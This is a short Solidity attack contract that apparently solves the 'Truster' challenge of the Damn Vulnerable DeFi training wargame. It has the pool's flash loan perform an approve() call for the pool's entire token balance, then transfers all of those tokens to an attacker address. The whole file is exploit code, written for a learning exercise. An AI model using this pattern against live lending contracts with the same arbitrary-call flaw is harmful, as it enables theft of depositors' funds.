pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract AttackTrusterPool {
    using Address for address payable;

    TrusterLenderPool private immutable pool;
    DamnValuableToken private immutable token;

    constructor(address payable poolAddress, address payable tokenAddress) {
        pool = TrusterLenderPool(poolAddress);
        token = DamnValuableToken(tokenAddress);
    }

    function drainPool(address attackerAddress) external {
      // check the balance to drain
      uint256 balanceToDrain = token.balanceOf(address(pool));

      // set approval to the contract
      bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), balanceToDrain);

      // do flashloan
      pool.flashLoan(0, attackerAddress, address(token), payload);

      // drain after flash loan
      token.transferFrom(address(pool), attackerAddress, balanceToDrain);
    }
}